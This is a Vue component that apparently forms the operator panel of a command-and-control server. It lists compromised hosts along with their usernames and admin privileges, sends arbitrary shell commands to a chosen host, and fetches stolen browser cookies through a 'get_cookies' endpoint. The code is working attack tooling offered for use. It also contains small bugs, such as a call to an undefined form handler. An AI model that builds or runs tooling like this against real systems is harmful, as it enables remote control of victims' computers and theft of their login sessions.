<style scoped>
.assets {
  padding: 1rem;
}

.error {
  color: red;
  font-weight: bold;
}

.success {
  color: green;
  font-weight: bold;
}

table {
  margin-top: 1rem;
}

th,
td {
  /* border: 1px solid #ddd; */
  padding: 0.5rem;
  text-align: left;
}

th {
  color: white;
}

tbody tr:nth-child(even) {
  background-color: #f9f9f9;
}
</style>

<script setup>
import { ref, inject, onMounted, onUnmounted } from 'vue';

const C2_SERVER = inject('C2_SERVER');
const API_KEY = inject('API_KEY');

const loading = ref(true);          // Show loading
const systemData = ref([]);         // Store assets data
const fetchErrorMessage = ref("");  // Show asssets loading error message
let refreshInterval = null;         // Track interval for refreshing assets
const selectedHost = ref(null);     // Track which host has an open form
const activeAction = ref(null);     // Track which action
const actionSuccess = ref(null);    // Track action sucess
const actionError = ref(null);      // Track action error
const showModal = ref(false)

// Function to update alive hosts table
const fetchAliveHosts = async () => {
  try {
    // Show loading
    loading.value = true;

    // HTTP Response
    const response = await fetch(C2_SERVER + '/get_hosts?API_KEY=' + API_KEY);
    if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
    const data = await response.json();
    console.log(data)

    // if (data.length === 0) fetchErrorMessage.value = "";
    systemData.value = data;

  }
  catch (error) {
    console.error('Error fetching alive hosts:', error);
    fetchErrorMessage.value = "No connection to C2 Server";
    systemData.value = [];
  }
  finally {
    console.log('finished fetching alive hosts')
    loading.value = false;
  }
};

// Function to format the last seen timestamp
const formatLastSeen = (timestamp) => {
  const date = new Date(timestamp * 1000);
  return date.toLocaleString();
};

// // Function to show/hide the command input form
const toggleForm = (hostname, action) => {
  if (activeAction.value === action) {
    console.log("Hiding")
    selectedHost.value = null;
    activeAction.value = null;
  }
  else {
    console.log("Showing")
    selectedHost.value = hostname; // Show form for the selected host
    activeAction.value = action
    commandInput.value = ""; // Reset input field
  }
};

const commandInput = ref("");  // Store the command input
const sendCommand = async (hostname) => {
  if (!commandInput.value.trim()) selectedHost.value = null

  try {
    if (commandInput.value === "") return

    // HTTP response
    const response = await fetch(`${C2_SERVER}/send_command?hostname=${hostname}&command=${encodeURIComponent(commandInput.value)}&apikey=${API_KEY}`, { method: "POST" });
    if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
    const data = await response.json();

    // Let user know
    console.log("Command sent successfully:", data);
    actionSuccess.value = `Command sent to ${hostname}: "${commandInput.value}"`;
    setTimeout(() => actionSuccess.value = "", 3000)
  }
  catch (error) {
    console.error("Error sending command:", error);
    actionError.value = `Error sending command: ${error}`;
    setTimeout(() => actionError.value = "", 3000)
  }
  finally {
    selectedHost.value = null; // Hide the command form after submission
    toggleForm('', 'command')
  }
};

// Function to download cookies
const downloadCookies = async (hostname) => {
  const response = await fetch(`${C2_SERVER}/get_cookies?hostname=${hostname}&apikey=${API_KEY}`, { method: "GET" });
};

onMounted(() => {
  fetchAliveHosts();
  refreshInterval = setInterval(fetchAliveHosts, 10000);
});

onUnmounted(() => {
  if (refreshInterval) {
    clearInterval(refreshInterval);
  }
});

</script>

<template>
  <main>
    <section class="assets">
      <h1>Alive Hosts</h1>

      <!-- Show assets loading message -->
      <p v-if="loading">Loading alive hosts...</p>

      <!-- Show assets error message if fetching fails -->
      <p v-else-if="fetchErrorMessage" class="error">{{ errorMessage }}</p>

      <!-- Show "No alive assets" if systemData is empty -->
      <p v-else-if="systemData.length === 0">No alive assets</p>

      <!-- Action Success || Error message -->
      <p v-if="actionSuccess" class="success">{{ actionSuccess }}</p>
      <p v-if="actionError" class="error">{{ actionError }}</p>

      <!-- Assets table -->
      <table v-else class="assets-table" cellspacing="0" cellpadding="0">
        <thead>
          <tr>
            <th>Hostname</th>
            <th>OS Type</th>
            <th>OS Version</th>
            <th>Username</th>
            <th>Is Admin User</th>
            <th>Is Admin Process</th>
            <th>Host Time</th>
            <th>Last Seen</th>
            <th>Actions</th>
          </tr>
        </thead>
        <tbody>
          <tr v-for="(item, index) in systemData" :key="index">
            <td>{{ item.system_data.hostname }}</td>
            <td>{{ item.system_data.os_type }}</td>
            <td>{{ item.system_data.os_version }}</td>
            <td>{{ item.system_data.username }}</td>
            <td>{{ item.system_data.is_admin_user ? 'Yes' : 'No' }}</td>
            <td>{{ item.system_data.is_admin_process ? 'Yes' : 'No' }}</td>
            <td>{{ item.system_data.host_time }}</td>
            <td>{{ formatLastSeen(item.last_seen) }}</td>
            <td class="actions">
              <div>

                <!-- Command button -->
                <button
                  v-if="selectedHost === item.system_data.hostname && activeAction === 'command' || selectedHost === null && activeAction === null"
                  class="action-button" :class="{ 'active': activeAction === 'command' }"
                  @click="toggleForm(item.system_data.hostname, 'command')">Quick Command</button>
                <div v-if="selectedHost === item.system_data.hostname && activeAction == 'command'" class="form">
                  <input v-model="commandInput" placeholder="Enter command..." />
                  <button @click="sendCommand(item.system_data.hostname)">Send</button>
                  <button @click="toggleCommandForm(null)">Cancel</button>
                </div>



              </div>
            </td>
          </tr>
        </tbody>
      </table>

      <!-- Modal -->
      <button id="show-modal" @click="showModal = true">Show Modal</button>
      <transition name="modal" v-if="showModal" @close="showModal = false">
        <div class="modal-mask">
          <div class="modal-wrapper">
            <div class="modal-container">

              <div class="modal-header">
                <slot name="header">
                  default header
                </slot>
              </div>

              <div class="modal-body">
                <slot name="body">
                  default body
                </slot>
              </div>

              <div class="modal-footer">
                <slot name="footer">
                  default footer
                  <button id="show-modal" @click="showModal = false">Close</button>

                </slot>
              </div>
            </div>
          </div>
        </div>
      </transition>



    </section>
  </main>
</template>
